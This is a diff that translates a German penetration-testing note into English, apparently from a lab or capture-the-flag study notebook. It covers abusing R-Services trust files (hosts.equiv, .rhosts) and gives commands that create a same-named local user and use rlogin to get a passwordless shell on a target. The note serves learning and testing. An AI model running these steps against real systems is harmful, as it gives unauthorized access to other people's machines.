@@ -4,39 +4,39 @@ aliases: [rlogin, rsh, R-Services]
 ---
 # R-Services Abuse
 
-> **R-Services** (R = Remote) sind der Vorgänger von SSH aus der Unix-Dienstfamilie: `rlogin`, `rsh`, `rexec`. Sie vertrauen Hosts/Usern über Konfigdateien – ist das zu lax konfiguriert, Login **ohne Passwort**.
+> **R-Services** (R = Remote) are the predecessor of SSH from the Unix service family: `rlogin`, `rsh`, `rexec`. They trust hosts/users via config files – if configured too loosely, login happens **without a password**.
 
-## Erkennen (nmap)
+## Detecting (nmap)
 ```
 512/tcp open  exec   netkit-rsh rexecd
 513/tcp open  login? 
 514/tcp open  shell  Netkit rshd
 ```
 
-## Trust-Mechanismus
-| Datei              | Scope      | Wirkung                                         |
-| ------------------ | ---------- | ----------------------------------------------- |
-| `/etc/hosts.equiv` | systemweit | vertrauenswürdige Hosts/User für alle Accounts  |
-| `~/.rhosts`        | pro User   | vertrauenswürdige Hosts/User für diesen Account |
-- Einträge `+ +` (jeder Host, jeder User) oder ein konkreter `+ <user>` erlauben passwortlosen Login.
+## Trust mechanism
+| File               | Scope       | Effect                                          |
+| ------------------ | ----------- | ----------------------------------------------- |
+| `/etc/hosts.equiv` | system-wide | trusted hosts/users for all accounts            |
+| `~/.rhosts`        | per user    | trusted hosts/users for this account            |
+- Entries `+ +` (any host, any user) or a specific `+ <user>` allow passwordless login.
 
 ```bash
 cat /etc/hosts.equiv
-# + sadm        <- user sadm darf sich ohne Passwort einloggen
+# + sadm        <- user sadm may log in without a password
 ```
-## Ausnutzen
-> [!info] Bedingung
-> Der **lokale** User (auf Kali), über den man einloggt, muss **denselben Namen** tragen wie der Ziel-User.
+## Exploiting
+> [!info] Condition
+> The **local** user (on Kali) used to log in must have the **same name** as the target user.
 
 ```bash
-# auf Kali: Client installieren + gleichnamigen User anlegen
+# on Kali: install the client + create a user of the same name
 sudo apt install rsh-client -y
-sudo useradd sadm -m -s /bin/bash   # -m: Home anlegen, -s: Login-Shell
-sudo su - sadm                      # zu sadm wechseln ("-" = Login-Shell)
+sudo useradd sadm -m -s /bin/bash   # -m: create home, -s: login shell
+sudo su - sadm                      # switch to sadm ("-" = login shell)
 
-# per Remote-Login auf die Box
-rlogin -l sadm <ziel-ip>            # -l = "log mich als diesen User ein"
+# log in to the box via remote login
+rlogin -l sadm <target-ip>          # -l = "log me in as this user"
 ```
-=> Shell als Ziel-User, ganz ohne Passwort.
+=> Shell as the target user, with no password at all.
 
 Tool: [[rlogin]]
